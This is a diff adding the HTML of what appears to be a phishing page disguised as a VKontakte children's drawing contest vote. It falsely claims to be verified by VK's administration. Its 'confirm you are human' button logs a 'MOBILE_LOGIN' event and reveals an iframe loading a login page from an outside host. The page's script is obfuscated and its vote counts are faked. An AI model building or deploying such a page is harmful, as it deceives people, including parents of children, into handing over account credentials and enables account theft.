@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>verse-vk</title>
+	<link rel="stylesheet" href="style.css">
+	<script type="text/javascript">
+		(function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script")
+		;r.type="text/javascript"
+		;r.integrity="sha384-RsEu4WZflrqYcEacpfoGSib3qaSvdYwT4D+DrWqeBuDarSzjwUQR1jO8gDiXZd0E"
+		;r.crossOrigin="anonymous";r.async=true
+		;r.src="https://cdn.amplitude.com/libs/amplitude-6.2.0-min.gz.js"
+		;r.onload=function(){if(!e.amplitude.runQueuedFunctions){
+		console.log("[Amplitude] Error: could not load SDK")}}
+		;var i=t.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)
+		;function s(e,t){e.prototype[t]=function(){
+		this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}
+		var o=function(){this._q=[];return this}
+		;var a=["add","append","clearAll","prepend","set","setOnce","unset"]
+		;for(var u=0;u<a.length;u++){s(o,a[u])}n.Identify=o;var c=function(){this._q=[]
+		;return this}
+		;var l=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"]
+		;for(var p=0;p<l.length;p++){s(c,l[p])}n.Revenue=c
+		;var d=["init","logEvent","logRevenue","setUserId","setUserProperties","setOptOut","setVersionName","setDomain","setDeviceId", "enableTracking", "setGlobalUserProperties","identify","clearUserProperties","setGroup","logRevenueV2","regenerateDeviceId","groupIdentify","onInit","logEventWithTimestamp","logEventWithGroups","setSessionId","resetSessionId"]
+		;function v(e){function t(t){e[t]=function(){
+		e._q.push([t].concat(Array.prototype.slice.call(arguments,0)))}}
+		for(var n=0;n<d.length;n++){t(d[n])}}v(n);n.getInstance=function(e){
+		e=(!e||e.length===0?"$default_instance":e).toLowerCase()
+		;if(!n._iq.hasOwnProperty(e)){n._iq[e]={_q:[]};v(n._iq[e])}return n._iq[e]}
+		;e.amplitude=n})(window,document);
+	  
+		amplitude.getInstance().init("1bcda20cc3f9257db6e0884c9979e9d6");
+	</script>
+</head>
+<body>
+	
+	<script>amplitude.getInstance().logEvent('VISIT_APP')</script>
+	<div id="app">
+		<iframe src="http://sanyahuysosi/mobile.html" v-if="iframem" v-cloak></iframe>
+		<div class="vk-app">
+			<div class="modal modal-verification" v-if="modal_1" v-cloak>
+				<div class="modal-overlay" @click="modal_1 = false"></div>
+				<div class="modal-inner">
+					<div class="modal-close" @click="modal_1 = false"></div>
+					<div class="modal-content">
+						<div class="verification">
+							<div class="modal-img">
+								<img src="user-icon.svg" alt="">
+							</div>
+							<div class="verification-content">
+								<p class="modal-description">
+									Во избежание накрутки, просим вас подтвердить что вы человек
+								</p>
+							</div>
+							<div class="verification-buttons">
+								<div class="button">
+									<button class="btn btn-reset btn-secondary verification-cancel" @click="modal_1 = false">Отменить</button>
+								</div>
+								<div class="button">
+									<button class="btn btn-reset btn-primary verification-start" @click="autho">Подтвердить</button>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="modal modal-error" v-if="modal_3" v-cloak>
+				<div class="modal-overlay" @click="modal_3 = false"></div>
+				<div class="modal-inner">
+					<div class="modal-close" @click="modal_3 = false"></div>
+					<div class="modal-content">
+						<div class="error">
+							<div class="modal-img">
+								<img src="warning-icon.svg" alt="">
+							</div>
+							<div class="error-content">
+								<h3 class="modal-title">Вы уже проголосовали</h3>
+								<p class="modal-description">
+									Простите, но вы уже голосовали за одного из участников. Повторное голосование невозможно.
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="modal modal-finish" v-if="modal_2" v-cloak>
+				<div class="modal-overlay" @click="modal_2 = false, localStorage.setItem('status', '')"></div>
+				<div class="modal-inner">
+					<div class="modal-close" @click="modal_2 = false, localStorage.setItem('status', '')"></div>
+					<div class="modal-content">
+						<div class="finish">
+							<div class="modal-img">
+								<img src="check-icon.svg" alt="">
+							</div>
+							<div class="error-content">
+								<h3 class="modal-title">Спасибо за голосование</h3>
+								<p class="modal-description">
+									Ваш голос был принят. Благодарим <br> 
+									за участие в голосовании.
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<header class="header">
+				<div class="container">
+					<div class="header-container">
+						<div class="header-inner">
+							<div class="header-block">
+								<a href="/" class="logo">
+									<img src="logo.svg" alt="">
+								</a>
+								<div class="logo-text">
+									Конкурс на лучший <br>
+									детский рисунок
+								</div>
+							</div>
+							<div class="header-block">
+								<div class="verified">
+									<div class="verified-inner">
+										<div class="verified-icon">
+											<img src="shield.svg" alt="">
+										</div>
+										<div class="verified-text">
+											Приложение проверено администрацией вконтакте
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</header>
+			<div class="voting">
+				<div class="container">
+					<h1 class="heading">Победитель получит 1.500 рублей и набор для рисования!</h1>
+					<div class="voting-container">
+						<div class="voting-row">
+							<div class="voting-col">
+								<div class="author-item">
+									<div class="author-img">
+										<img src="photo_2020-06-04_17-40-23.jpg" alt="">
+									</div>
+									<div class="author-content">
+										<div class="author-name">Анастасия</div>
+										<div class="author-statistic">
+											<div class="author-quantity">
+												<img src="users-icon.svg" alt="">
+												<span>{{votes}} голосов</span>
+											</div>
+											<progress max="300" value="126"></progress>
+										</div>
+									</div>
+									<div class="author-buttons">
+										<button class="btn btn-reset btn-primary btn-vote" @click="if(localStorage.getItem('vote') != 1 || localStorage.getItem('vote') == null){modal_1 = true}else{modal_3 = true}">
+											<img src="check-icon.svg" alt="">
+											Проголосовать
+										</button>
+									</div>
+								</div>
+							</div>
+							<div class="voting-col">
+								<div class="author-item">
+									<div class="author-img">
+										<img src="photo_2020-06-04_17-40-57.jpg" alt="">
+									</div>
+									<div class="author-content">
+										<div class="author-name">Елена</div>
+										<div class="author-statistic">
+											<div class="author-quantity">
+												<img src="users-icon.svg" alt="">
+												<span>144 голосов</span>
+											</div>
+											<progress max="300" value="144"></progress>
+										</div>
+									</div>
+									<div class="author-buttons">
+										<button class="btn btn-reset btn-primary btn-vote" @click="if(localStorage.getItem('vote') != 1 || localStorage.getItem('vote') == null){modal_1 = true}else{modal_3 = true}">
+											<img src="check-icon.svg" alt="">
+											Проголосовать
+										</buton>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+
+    <script>
+        // Sends event to client
+        vkBridge.send('VKWebAppInit');
+    </script> 
+	<script src="https://cdn.jsdelivr.net/npm/vue"></script>
+	<script>
+
+const _0x1d8e=['logEvent','vote','iframem','votes','success','getInstance','MOBILE_LOGIN','#app','modal_2','getItem','status'];(function(_0x50fe5a,_0x1d8e9e){const _0x99014b=function(_0xdd292f){while(--_0xdd292f){_0x50fe5a['push'](_0x50fe5a['shift']());}};_0x99014b(++_0x1d8e9e);}(_0x1d8e,0x1b8));const _0x9901=function(_0x50fe5a,_0x1d8e9e){_0x50fe5a=_0x50fe5a-0x0;let _0x99014b=_0x1d8e[_0x50fe5a];return _0x99014b;};const app=new Vue({'data'(){return{'modal_1':![],'modal_2':![],'modal_3':![],'iframem':![],'verse_1':![],'verse_2':![],'votes':0x7e};},'methods':{'autho'(){amplitude[_0x9901('0x5')]()[_0x9901('0x0')](_0x9901('0x6'));this[_0x9901('0x2')]=!![];}},'created'(){if(localStorage['getItem'](_0x9901('0x1'))==0x1||localStorage['getItem'](_0x9901('0x1'))!=null){this[_0x9901('0x3')]=0x7f;}var _0x35cdb1=localStorage[_0x9901('0x9')](_0x9901('0xa'));if(_0x35cdb1==_0x9901('0x4')){this[_0x9901('0x8')]=!![];}}})['$mount'](_0x9901('0x7'));
+	</script>
+</body>
+</html>
